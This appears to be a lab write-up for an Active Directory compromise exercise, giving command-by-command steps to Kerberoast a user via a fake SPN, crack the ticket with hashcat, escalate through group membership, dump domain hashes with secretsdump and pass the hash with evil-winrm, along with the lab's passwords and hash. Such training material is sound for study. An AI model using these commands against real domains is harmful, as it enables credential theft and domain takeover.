# [Active Directory Compromise](Active%20Directory%20Compromise.md)
### Set a fake SPN on the ttimmons user. Kerberoast this user and crack the TGS ticket offline to reveal their cleartext password. Submit this password as your answer.

Before doing this lab, we need to setup [ligolo-ng](https://github.com/nicocha30/ligolo-ng)

```powershell
PS C:\DotNetNuke\Portals\0> $SecPassword = ConvertTo-SecureString 'DBAilfreight1!' -AsPlainText -Force 
PS C:\DotNetNuke\Portals\0> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\mssqladm', $SecPassword)
PS C:\DotNetNuke\Portals\0> Set-DomainObject -credential $Cred -Identity ttimmons -SET @{serviceprincipalname='acmetesting/LEGIT'} -Verbose
```
![](Screenshot%202026-09-06%20at%2016.11.25.png)

```shell
proxychains GetUserSPNs.py -dc-ip 172.16.8.3 INLANEFREIGHT.LOCAL/mssqladm -request-user ttimmons
```
![](Screenshot%202026-09-07%20at%2008.59.25.png)

```shell
hashcat -m 13100 ttimmons_tgs /usr/share/wordlists/rockyou.txt
```
![](Screenshot%202026-09-07%20at%2009.01.18.png)

___
### After obtaining Domain Admin rights, authenticate to the domain controller and submit the contents of the flag.txt file on the Administrator Desktop.

```powershell
$timpass = ConvertTo-SecureString 'Repeat09' -AsPlainText -Force

$timcreds = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\ttimmons', $timpass)

$group = Convert-NameToSid "Server Admins" 

Add-DomainGroupMember -Identity $group -Members 'ttimmons' -Credential $timcreds -verbose
```
![](Screenshot%202026-09-07%20at%2008.44.24.png)

```shell
secretsdump.py ttimmons@172.16.8.3 -just-dc-ntlm
```
![](Screenshot%202026-09-07%20at%2009.02.56.png)

```shell
evil-winrm -i 172.16.8.3 -u Administrator -H fd1f7e5564060258ea787ddbb6e6afa2
```

___
### Compromise the INLANEFREIGHT.LOCAL domain and dump the NTDS database. Submit the NT hash of the Administrator account as your answer.

![](Screenshot%202026-09-07%20at%2009.08.14.png)